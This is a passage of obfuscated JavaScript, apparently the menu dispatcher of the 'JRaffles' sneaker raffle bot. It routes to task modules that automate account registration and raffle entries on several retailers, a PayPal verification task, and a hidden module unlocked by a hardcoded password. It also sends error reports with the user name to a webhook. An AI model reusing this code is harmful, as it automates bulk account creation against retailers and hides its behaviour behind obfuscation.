                                    return _0x4acd48['shuffleTasks'] && await _0x5598e4(_0x1064f9), await _0x4e95b5['function'](_0x4e95b5, _0x1064f9, _0x513f69), _0xe2bae3();
                                } else {
                                    if (taskFunction == 0x1) {
                                        var _0x513f69 = await _0x2ab53c();
                                        return await _0x4e95b5['function'](_0x4e95b5, null, _0x513f69), _0xe2bae3();
                                    }
                                }
                                ;
                            } else {
                                if (_0x5f28dd[taskModule]['name'] == 'BOUNCEWEAR') {
                                    taskFunction = await _0x6885a(_0x5f28dd[taskModule]['modules']);
                                    var _0x4e95b5 = _0x5f28dd[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0)
                                        await bwAcc('https://bouncewear.com/nl/account/register', _0x4e95b5);
                                    else {
                                        if (taskFunction == 0x1) {
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x5f28dd[taskModule]['name'] == 'PATTA') {
                                        taskFunction = await _0x6885a(_0x5f28dd[taskModule]['modules']);
                                        var _0x4e95b5 = _0x5f28dd[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0) {
                                            var _0x513f69 = await _0x2ab53c(), _0x5912c5 = await _0x1a71aa();
                                            return _0x4acd48['shuffleTasks'] && await _0x5598e4(_0x5912c5), await _0x4e95b5['function'](_0x4e95b5, _0x5912c5, _0x513f69), _0xe2bae3();
                                        } else {
                                            if (taskFunction == 0x1) {
                                                var _0x513f69 = await _0x2ab53c(), _0x5912c5 = await _0x1a71aa();
                                                return _0x4acd48['shuffleTasks'] && await _0x5598e4(_0x5912c5), await _0x4e95b5['function'](_0x4e95b5, _0x5912c5, _0x513f69), _0xe2bae3();
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x5f28dd[taskModule]['name'] == 'SLAM\x20JAM') {
                                            taskFunction = await _0x6885a(_0x5f28dd[taskModule]['modules']);
                                            var _0x4e95b5 = _0x5f28dd[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x513f69 = await _0x2ab53c(), _0xa3b083 = await _0x1a71aa();
                                                return _0x4acd48['shuffleTasks'] && await _0x5598e4(_0xa3b083), await _0x4e95b5['function'](_0x4e95b5, _0xa3b083, _0x513f69), _0xe2bae3();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x513f69 = await _0x2ab53c(), _0xa3b083 = await _0x1a71aa();
                                                    return _0x4acd48['shuffleTasks'] && await _0x5598e4(_0xa3b083), await _0x4e95b5['function'](_0x4e95b5, _0xa3b083, _0x513f69), _0xe2bae3();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x5f28dd[taskModule]['name'] == 'KICKZ') {
                                                taskFunction = await _0x6885a(_0x5f28dd[taskModule]['modules']);
                                                var _0x4e95b5 = _0x5f28dd[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x513f69 = await _0x2ab53c(), _0x1cf53e = await _0x1a71aa();
                                                    return _0x4acd48['shuffleTasks'] && await _0x5598e4(_0x1cf53e), await _0x4e95b5['function'](_0x4e95b5, _0x1cf53e, _0x513f69), _0xe2bae3();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x513f69 = await _0x2ab53c(), _0x1cf53e = await _0x1a71aa();
                                                        return _0x4acd48['shuffleTasks'] && await _0x5598e4(_0x1cf53e), await _0x4e95b5['function'](_0x4e95b5, _0x1cf53e, _0x513f69), _0xe2bae3();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x5f28dd[taskModule]['name'] == 'JD') {
                                                    taskFunction = await _0x6885a(_0x5f28dd[taskModule]['modules']);
                                                    var _0x4e95b5 = _0x5f28dd[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x513f69 = await _0x2ab53c(), _0xaefd45 = await _0x1a71aa();
                                                        return _0x4acd48['shuffleTasks'] && await _0x5598e4(_0xaefd45), await _0x4e95b5['function'](_0x4e95b5, _0xaefd45, _0x513f69), _0xe2bae3();
                                                    }
                                                } else {
                                                    if (_0x5f28dd[taskModule]['name'] == 'Seven\x20Store')
                                                        return console['log']('returning\x20to\x20menu'), await _0x505897(0x3e8), _0xe2bae3();
                                                    else {
                                                        if (_0x5f28dd[taskModule]['name'] == 'Paypal\x20Verification') {
                                                            var _0x22d257 = _0x5f28dd[taskModule]['name'], _0x513f69 = await _0x2ab53c();
                                                            return await _0x400d2d(_0x22d257, _0x513f69), _0xe2bae3();
                                                        } else {
                                                            if (_0x5f28dd[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                taskFunction = await _0x6885a(_0x5f28dd[taskModule]['modules']);
                                                                var _0x4e95b5 = _0x5f28dd[taskModule]['modules'][taskFunction];
                                                                return await _0x4e95b5['function'](_0x4e95b5), _0xe2bae3();
                                                            } else {
                                                                if (_0x5f28dd[taskModule]['name'] == 'Change\x20Settings') {
                                                                    console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                    var _0x172615 = 0x0;
                                                                    for (const _0x536e0b in _0x4acd48) {
                                                                        console['log']('(' + _0x172615 + ')\x20' + _0x536e0b + '\x20:\x20' + _0x4acd48[_0x536e0b]), _0x172615++;
                                                                    }
                                                                    console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x172615 + ')\x20Return\x20to\x20Main\x20Menu');
                                                                    var _0x17e1b0 = await _0x4051f9();
                                                                    if (_0x17e1b0 == _0x172615)
                                                                        return _0xe2bae3();
                                                                    console['clear'];
                                                                    var _0x1d3cce = 0x0;
                                                                    for (var _0x2d99cb in _0x4acd48) {
                                                                        if (_0x17e1b0 == _0x1d3cce) {
                                                                            console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x2d99cb + '\x20:'), _0x4acd48[_0x2d99cb] = await _0x9f11ff(), _0x5d8933['writeFileSync']('../settings.json', JSON['stringify'](_0x4acd48));
                                                                            break;
                                                                        } else
                                                                            _0x1d3cce++;
                                                                    }
                                                                    return console['log']('Settings\x20Saved!'), await _0x505897(0xbb8), _0xe2bae3();
                                                                } else {
                                                                    if (_0x5f28dd[taskModule]['name'] == 'Reload\x20Settings')
                                                                        return console['log']('Reloading\x20settings'), await _0x224931(), _0xe2bae3();
                                                                    else {
                                                                        if (taskModule == 0x45) {
                                                                            _0x5f28dd[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                            var _0x145d6d = await _0x4bde0d();
                                                                            _0x145d6d == 'ModuleVoorDeBoys' ? (await afewScraper(), await _0x4ed524(), await afewFunction(_0x3ee30b[_0x5b78a8], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x505897(0xbb8));
                                                                        } else {
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            try {
                await _0xe2bae3();
            } catch (_0x429628) {
                return console['log'](_0x429628), _0xe2bae3();
            }
        } catch (_0xb58ee9) {
            return console['log'](_0xb58ee9), await _0x505897(0x3a98);
        }
}
;
_0x4041fe('JRaffles\x20' + _0x5d34b4), _0x224931();
try {
    _0x4dc431();
} catch (_0x209fe2) {
    var _0x4f7901 = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0xdaef84
            },
            {
                'name': 'Version',
                'value': '' + _0x5d34b4
            },
            {
                'name': 'Error',
                'value': '' + _0x209fe2
            }
        ]
    }];
    const _0x19ba36 = { 'embeds': _0x4f7901 };
    _0x1abce0(_0x3b044a, _0x19ba36);
}